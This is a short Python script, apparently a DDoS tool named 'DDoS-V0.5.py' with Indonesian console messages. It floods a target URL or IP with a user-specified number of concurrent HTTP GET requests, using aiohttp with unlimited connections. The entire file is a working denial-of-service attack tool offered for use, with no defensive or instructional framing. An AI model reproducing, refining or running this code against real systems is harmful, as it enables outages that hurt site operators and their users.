import asyncio
import aiohttp
import sys
import time

async def send(session, url):
    try:
        async with session.get(url):
            pass
    except:
        pass

async def main(url, jumlah):
    jumlah = int(jumlah)
    conn = aiohttp.TCPConnector(limit=0)
    timeout = aiohttp.ClientTimeout(total=3)

    print(f"\n[+] Proses Mengirim Serangan Ke IP Tersebut: {url}")
    start = time.time()

    async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
        tasks = [send(session, url) for _ in range(jumlah)]
        await asyncio.gather(*tasks)

    durasi = time.time() - start
    print(f"[✓] Selesai Mengirim Serangan ({jumlah} request) dalam {durasi:.2f} detik\n")

if __name__ == "__main__":
    if len(sys.argv) < 3:
        print("Usage: python DDoS-V0.5.py http://<ip/web> <jumlah_request>")
    else:
        url = sys.argv[1]
        jumlah = sys.argv[2]
        try:
            asyncio.run(main(url, jumlah))
        except KeyboardInterrupt:
            print("\n[!] Serangan dihentikan oleh user.")